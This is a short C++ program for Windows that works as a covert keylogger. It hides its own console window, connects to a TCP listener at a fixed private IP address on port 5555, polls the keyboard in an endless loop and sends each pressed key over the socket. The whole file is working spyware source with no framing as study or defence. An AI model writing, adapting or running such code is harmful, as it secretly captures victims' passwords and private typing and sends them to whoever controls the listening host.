#include <iostream>
#include <winsock2.h>
#include <Windows.h>


int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char KEYPRESSED;

    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    WSAStartup(MAKEWORD(2, 0), &WSAData);
    server = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_addr.s_addr = inet_addr("172.16.160.10");
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555);
    connect(server, (SOCKADDR *)&addr, sizeof(addr));

        while (true) {
        Sleep(10);
        for (int KEYPRESSED = 0x8; KEYPRESSED < 0xFF; KEYPRESSED++)
        {
            if (GetAsyncKeyState(KEYPRESSED) == -32767) { 						//if key is pressed
                        char buffer[10];
                        buffer[0] = KEYPRESSED;
                        send(server, buffer, sizeof(buffer), 0);
            }
        }
}
closesocket(server);
WSACleanup();
}
